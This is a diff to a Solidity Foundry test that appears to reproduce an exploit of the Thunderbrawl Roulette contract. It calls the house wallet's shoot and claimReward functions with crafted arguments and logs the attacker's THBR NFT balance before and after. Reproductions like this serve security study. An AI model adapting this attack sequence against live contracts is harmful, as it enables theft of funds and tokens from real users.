@@ -57,7 +57,7 @@ contract ContractTest is DSTest{
     string name1 = "WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME";
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
+    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract
         
 
     function setUp() public {
@@ -66,20 +66,18 @@ contract ContractTest is DSTest{
 
     function testExploit() public{
 
-        emit log_named_decimal_uint(
-            "[Start] Attacker BNB balance before exploit",
-            address(this).balance,
-            18
+        emit log_named_uint(
+            "Attacker THBR balance before exploit",
+            THBR.balanceOf(address(this))
         );
 
         houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);
         uint256 _amount = houseWallet.winners(gameId, add);
         houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
 
-        emit log_named_decimal_uint(
-            "Attacker BNB balance after exploit",
-            address(this).balance,
-            18
+        emit log_named_uint(
+            "Attacker THBR balance after exploit",
+            THBR.balanceOf(address(this))
         );
 
     }
